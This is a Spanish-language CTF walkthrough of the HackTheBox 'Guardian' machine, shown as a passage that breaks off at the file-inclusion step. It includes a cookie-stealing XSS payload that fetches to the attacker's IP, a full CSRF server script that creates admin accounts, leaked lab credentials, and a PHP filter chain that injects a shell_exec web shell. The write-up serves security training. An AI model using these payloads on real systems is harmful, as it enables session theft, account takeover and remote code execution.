---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Guardian HackTheBox (Hard)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 09:22 EDT
Nmap scan report for 10.10.11.84
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de💿42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
```

Veremos que hay varios puertos interesantes, entre ellos un puerto `80` el cual esta redirigiendo a un dominio llamado `guardian.htb`, el cual vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>          guardian.htb
```

Lo guardamos y entramos en dicho `dominio` de esta forma:

```
URL = http://guardian.htb/
```

Veremos una pagina normal de estudiantes, de una especie de universidad, si le damos al boton llamado `Student Portal` nos llevara a un `subdominio` llamado `portal`:

```
URL = http://portal.guardian.htb/
```

Pero como no lo tenemos en nuestro archivo `hosts` no nos va a cargar, por lo que vamos añadirlo:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           guardian.htb portal.guardian.htb
```

Lo guardamos y si volvemos a la pagina del `subdominio` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-27 153157.png" alt=""><figcaption></figcaption></figure>

## Escalate user web GU0142023

Cuando cargamos la pagina veremos que hay un `link` llamado `Portal Guide` en el que nos lleva a un `PDF` o en el boton llamado `Help` de abajo te lleva igual tambien, que te lleva a esta ruta:

```
URL = http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-27 155538.png" alt=""><figcaption></figcaption></figure>

Veremos que la contraseña por defecto de los usuarios es `GU1234`, es interesante saber eso, pero no tenemos ningun usuario actualmente, antes de probar una fuerza bruta con un listado de usuarios, si volvemos a la pagina principal y bajamos un poco veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-27 155734.png" alt=""><figcaption></figcaption></figure>

Vemos que hay `3` usuarios, si probamos directamente con el primero:

```
User: GU0142023
Pass: GU1234
```

Si estas credenciales las metemos en dicho `portal` veremos que funciona:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-27 155942.png" alt=""><figcaption></figcaption></figure>

Veremos como un `dashboard` de las cosas de la universidad, pero no veremos nada interesante en general, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://portal.guardian.htb/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://portal.guardian.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2900]
/login.php            (Status: 200) [Size: 2900]
/admin                (Status: 200) [Size: 2900]
/static               (Status: 403) [Size: 284]
/includes             (Status: 403) [Size: 284]
/javascript           (Status: 403) [Size: 284]
/student              (Status: 403) [Size: 284]
/logout.php           (Status: 200) [Size: 2900]
/config               (Status: 403) [Size: 284]
/vendor               (Status: 403) [Size: 284]
/forgot.php           (Status: 200) [Size: 1383]
/models               (Status: 403) [Size: 284]
Progress: 381494 / 882232 (43.24%)^C
```

No veremos nada interesante, pero si nos vamos a la parte de `Chat` y entramos en el primero, veremos algo asi en la `URL`:

```
URL = http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14
```

Vemos varios parametros en los cuales tienen unos numeros como por ejemplo en este caso `13` y `14`, si empezamos a toquetear esos numeros empezando desde el `0` hasta lo que nos aparezca en la pagina veremos algo interesante con estos numeros de `chat` de `URL`.

```
URL = http://portal.guardian.htb/student/chat.php?chat_users[0]=1&chat_users[1]=2
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-27 161729.png" alt=""><figcaption></figcaption></figure>

Vemos que hemos podido acceder a un chat gracias a ese `bypass` de numero atraves de la `URL` cosa que no se deberia de poder hacer, por lo que obtenemos una contraseña `DHsNnk3V503` y un nombre de usuario llamado `jamil.enockson`.

Sabemos que el usuario `jamil` tiene como id de usuario el `0` por lo que podemos ver en la `URL`, si nosotros siguiente esa logica formamos el nombre de usuario como estudiante que tendria que tener seria algo asi `GU0002023`, pero si lo probamos veremos que no nos funciona.

Como nos ha puesto que es un usuario de `gitea` vamos a probar a realizar un `fuzzing` a nivel de `subdominios` para ver si existiera alguno referente a `gitea`.

Antes nos descargamos un diccionario de `subdominios` de la siguiente pagina:

```shell
wget https://gist.githubusercontent.com/six2dez/a307a04a222fab5a57466c51e1569acf/raw
mv raw subdomains.txt
```

Ahora que tenemos el diccionario vamos hacer lo siguiente:

```shell
ffuf -c -w subdomains.txt -u http://guardian.htb -H "Host: FUZZ.guardian.htb" -fw 20
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://guardian.htb
 :: Wordlist         : FUZZ: /home/kali/Desktop/guardians/subdomains.txt
 :: Header           : Host: FUZZ.guardian.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
gitea                   [Status: 200, Size: 13498, Words: 1049, Lines: 245, Duration: 36ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Veremos que efectivamente hay un `subdominio` llamado `gitea`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             guardian.htb portal.guardian.htb gitea.guardian.htb
```

Lo guardamos y si entramos en la siguiente `URL`:

```
URL = http://gitea.guardian.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-27 163350.png" alt=""><figcaption></figcaption></figure>

Veremos que funciona, por lo que vamos a probar a meter las siguiente credenciales que encontramos:

```
User: jamil
Pass: DHsNnk3V503
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-27 163544.png" alt=""><figcaption></figcaption></figure>

Veremos que estaremos dentro, si investigamos un poco veremos este archivo de configuracion interesante:

```
URL = http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/config/config.php
```

Info:

```php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```

Si probamos dicha contraseña por `SSH` o en otros sitios no servira, por lo que vamos a seguir buscando.

Si por ejemplo buscamos mucho en todos los archivos veremos que en esta ruta de archivo...

```
URL = http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/composer.json
```

Info:

```json
{
    "require": {
        "phpoffice/phpspreadsheet": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```

Hay una version de `PHP` por asi decirlo, si buscamos informacion de dicha version veremos que tiene efectivamente una vulnerabilidad asociado a el para poder realizar un `XSS`.

La vulnerabilidad se llama `PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header` y encontraremos informacion en esta `URL`.

URL = [Exploit CVE-2024-56411 XSS](https://github.com/advisories/ghsa-hwcp-2h35-p66w)

Vemos que con un `payload` podremos injectar un comando subiendo un archivo `.xlsx` de una hoja de calculos a la pagina.

> Payload

```html
"><img src=x onerror=fetch('http://<IP>/?c='+btoa(document.cookie))>
```

Si volvemos a la pagina principal en `guardians.htb` y entramos en el panel del usuario de las credenciales que ya obtuvimos, si empezamos a probar esto, veremos que hay alerts en la parte de `assignments.php`, pero en el unico que pone `upcoming` veremos que nos deja entrar y subir un archivo `doc` o `xlsx`, por lo que por ahi tendremos que subir dicho `exploit` de la vulnerabilidad que encontramos.

Para ello utilizaremos una pagina para crear un archivo de `XLSX` real, pero con nuestro `payload` implementado en el mismo, para que cuando lo carguemos se ejecute.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-28 100259.png" alt=""><figcaption></figcaption></figure>

URL = [Pagina Hoja de calculos Online](https://www.treegrid.com/FSheet?source=post_page-----7f112334f10b---------------------------------------)

Ahora dentro de la pagina si nos vamos a este boton:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-28 100405.png" alt=""><figcaption></figcaption></figure>

Que estara abajo a la izquierda, se nos abrira algo asi:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-28 100429.png" alt=""><figcaption></figcaption></figure>

Le daremos al boton de añadir una seccion y como contenido pondremos el `payload` anterior que he mostrado, una vez echo esto vamos a guardarlo y exportarlo.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-28 100744.png" alt=""><figcaption></figcaption></figure>

Antes de enviarlo nos pondremos a la escucha con un servidor de `python3`.

```shell
python3 -m http.server 80
```

Ahora si lo enviamos y esperamos unos segundos veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.84 - - [28/Sep/2025 04:27:06] "GET /?c=UEhQU0VTU0lEPTFoYjZqNnFnNGQwaTFnM2o0bXI5ZXE0amxm HTTP/1.1" 200 -
```

Vemos que ha funcionado, con esto lo que hemos echo es enviarnos a nuestro servidor las `cookies` de dicho usuario que haya abierto el archivo, por lo que vamos a probarlas de esta forma:

```shell
echo 'UEhQU0VTU0lEPTFoYjZqNnFnNGQwaTFnM2o0bXI5ZXE0amxm' | base64 -d
```

Info:

```
PHPSESSID=1hb6j6qg4d0i1g3j4mr9eq4jlf
```

Si nos vamos a nuestro navegador e intercambiamos la `cookie` actual que tenemos por la que nos han proporcionado en esta parte...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-28 103015.png" alt=""><figcaption></figcaption></figure>

Y recargamos la pagina, veremos que somos el usuario `sammy.treat`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-28 103042.png" alt=""><figcaption></figcaption></figure>

Por lo que vemos ha funcionado, somo un usuario con rango `lector` que es como si fueramos un profesor de universidad dentro de la pagina del portal.

Si nos vamos a `Notice Board` y le damos al boton de `+ Create Notice` veremos que nos mete como en un panel en el que podemos escribir un mensaje y esto le llega al `admin`, abajo podremos poner una `URL` del supuesto archivo, si probamos a meter nuestra `URL` de primeras con un servidor de `python3` abierto para ver que pasa, veremos lo siguiente:

```shell
python3 -m http.server 80
```

Ahora si enviamos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-28 104450.png" alt=""><figcaption></figcaption></figure>

Esperando un poco en el servidor veremos esto otro:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.84 - - [28/Sep/2025 04:42:26] "GET / HTTP/1.1" 200 -
10.10.11.84 - - [28/Sep/2025 04:42:26] code 404, message File not found
10.10.11.84 - - [28/Sep/2025 04:42:26] "GET /favicon.ico HTTP/1.1" 404 -
```

Veremos que ha realizado una conexion, por lo que sabemos que intenta como descargarse un archivo, vamos aprovechar esto para hacer lo mismo de antes, pero en la parte de `URL` poner otro `payload` mejor.

Ahora lo que se nos ocurre es redireccionar al administrador cuando pongamos nuestra `IP` en un servidor de un script de `python3` de que cuando entre el admin a dicho servidor le redireccione a una pagina de exploit, para que cree un usuario con las credenciales que queramos como rol `admin`, esto lo podremos saber viendo desde `gitea` el `createuser.php` de la seccion `admin`.

> admin/createuser.php

```php
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/User.php';
require '../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$config = require '../config/config.php';
$salt = $config['salt'];

$userModel = new User($pdo);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $csrf_token = $_POST['csrf_token'] ?? '';

    if (!is_valid_token($csrf_token)) {
        die("Invalid CSRF token!");
    }

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $address = $_POST['address'] ?? '';
    $user_role = $_POST['user_role'] ?? '';

    // Check for empty fields
    if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
        $error = "All fields are required. Please fill in all fields.";
    } else {
        $password = hash('sha256', $password . $salt);

        $data = [
            'username' => $username,
            'password_hash' => $password,
            'full_name' => $full_name,
            'email' => $email,
            'dob' => $dob,
            'address' => $address,
            'user_role' => $user_role
        ];

        if ($userModel->create($data)) {
            header('Location: /admin/users.php?created=true');
            exit();
        } else {
            $error = "Failed to create user. Please try again.";
        }
    }
}
?>

............................<RESTO DE CODIGO>......................................
```

Pero necesitamos un `TOKEN` valido para poder hacer que esto funcione, si investigamos bien el codigo donde creamos la noticia en el panel, veremos lo siguiente:

```html
<input type="hidden" name="csrf_token" value="058430bcfe9dbf937a852e52cab448aa">
```

Vemos que hemos encontrado un `TOKEN` posiblemente valido, vamos a montarnos un script de `python3` para poner un servidor a la escucha y realizar esa redireccion para que cree un usuario (`CSRF`).

> server.py

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import random
import string

# CONFIGURACIÓN
CSRF_TOKEN = "058430bcfe9dbf937a852e52cab448aa"  # Tu token
YOUR_IP = "<IP>"

class AutoSubmitSSRFHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        client_ip = self.client_address[0]
        print(f"\n[+] Headless Chrome accedió desde: {client_ip}")
        print(f"[+] Path: {self.path}")
        
        # Generar credenciales únicas para cada visita
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        username = f"admin{random_suffix}"
        password = f"Pass{random_suffix}!"
        
        # HTML que auto-envía el formulario con nuestro token CSRF
        html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Security Portal - Loading</title>
</head>
<body>
    <h2>Security Portal - Initializing...</h2>
    <p>Please wait while we configure your admin access...</p>
    
    <!-- Formulario oculto que se auto-envía -->
    <form id="adminForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
        <input type="hidden" name="username" value="{username}">
        <input type="hidden" name="password" value="{password}">
        <input type="hidden" name="full_name" value="Auto Admin {random_suffix}">
        <input type="hidden" name="email" value="{username}@guardian.htb">
        <input type="hidden" name="dob" value="1990-01-01">
        <input type="hidden" name="address" value="Auto Created">
        <input type="hidden" name="user_role" value="admin">
        <input type="hidden" name="csrf_token" value="{CSRF_TOKEN}">
    </form>
    
    <script>
        console.log("Auto-creating admin user: {username}");
        
        // Enviar formulario automáticamente
        setTimeout(function() {{
            document.getElementById('adminForm').submit();
            console.log("Form submitted for user: {username}");
        }}, 100);
        
        // Redirección de respaldo por si falla el formulario
        setTimeout(function() {{
            window.location.href = "http://portal.guardian.htb/admin/createuser.php";
        }}, 2000);
    </script>
    
    <noscript>
        <meta http-equiv="refresh" content="0;url=http://portal.guardian.htb/admin/createuser.php">
    </noscript>
    
</body>
</html>
'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
        
        print(f"[+] Servido formulario auto-submit para usuario: {username}")
        print(f"[+] Credenciales: {username} / {password}")
        print(f"[+] Token CSRF usado: {CSRF_TOKEN}")
        
        # Guardar credenciales en archivo
        with open("created_admins.txt", "a") as f:
            f.write(f"{username}:{password}\n")
    
    def log_message(self, format, *args):
        print(f"[SSRF] {format % args}")

def start_ssrf_server():
    """Iniciar servidor SSRF"""
    print("🚀 SSRF AUTO-ADMIN CREATION SERVER")
    print("=" * 50)
    print(f"[+] Token CSRF: {CSRF_TOKEN}")
    print(f"[+] Tu IP: {YOUR_IP}")
    print("[+] Servidor escuchando en puerto 80")
    print("\n[INSTRUCCIONES]")
    print("1. Usa esta URL en reference_link: http://10.10.14.43/")
    print("2. El bot admin visitará y creará automáticamente un usuario admin")
    print("3. Las credenciales se guardarán en 'created_admins.txt'")
    print("4. Luego podrás loguearte con esas credenciales")
    print("\n[*] Esperando conexiones del bot admin...\n")
    
    server = HTTPServer(('0.0.0.0', 80), AutoSubmitSSRFHandler)
    server.serve_forever()

if __name__ == '__main__':
    start_ssrf_server()
```

Ahora vamos a establecer el servidor:

```shell
python3 server.py
```

Si enviamos el formulario como hicimos antes metiendo en la `URL` que vera el `admin` algo como `http://<IP_ATTACKER>/` y le damos a enviar, si esperamos un rato, veremos lo siguiente:

```
🚀 SSRF AUTO-ADMIN CREATION SERVER
==================================================
[+] Token CSRF: 058430bcfe9dbf937a852e52cab448aa
[+] Tu IP: <IP>
[+] Servidor escuchando en puerto 80

[INSTRUCCIONES]
1. Usa esta URL en reference_link: http://<IP>/
2. El bot admin visitará y creará automáticamente un usuario admin
3. Las credenciales se guardarán en 'created_admins.txt'
4. Luego podrás loguearte con esas credenciales

[*] Esperando conexiones del bot admin...


[+] Headless Chrome accedió desde: 10.10.11.84
[+] Path: /
[SSRF] "GET / HTTP/1.1" 200 -
[+] Servido formulario auto-submit para usuario: adminhntaxt
[+] Credenciales: adminhntaxt / Passhntaxt!
[+] Token CSRF usado: 058430bcfe9dbf937a852e52cab448aa
```

Veremos que ha funcionado la creacion de usuario aparentemente, vamos a probarlas, vamos a cerrar sesion y loguearnos en el panel con dichas credenciales creada, en mi caso:

```
User: adminhntaxt
Pass: Passhntaxt!
```

Si las probamos veremos que ha funcionado:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-28 112757.png" alt=""><figcaption></figcaption></figure>

Veremos que somos rol `admin` por lo que funciono todo de forma correcta, si vemos el archivo `reports.php` desde `gitea` vamos a ver un `LFI` super claro en esta parte del codigo:

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>

.............................<RESTO DE CODIGO>.....................................
```

Pero si probamos a intentar explotarlo:

```shell
curl -b "PHPSESSID=<COOKIE>" "http://portal.guardian.htb/admin/reports.php?report=../../../../etc/passwd"
```

Info:

```
<h2>Malicious request blocked 🚫 </h2>
```

Vamos a ver que como vimos en el codigo lo bloquea, por lo que tendremos que intentar `bypassearlo` de esta forma:

## LFI / RFI usando wrappers

Vamos a utilizar directamente `wrappers` de un `LFI` con el siguiente repositorio en el cual te genera un codigo para pegar en la `URL` y asi poder realizar un `RCE`.

URL = [Generate Wrapper LFI (RCE)](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)

```shell
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

Info:

```
[+] The following gadget chain will generate the following code : <?php echo shell_exec($_GET["cmd"]);?> (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

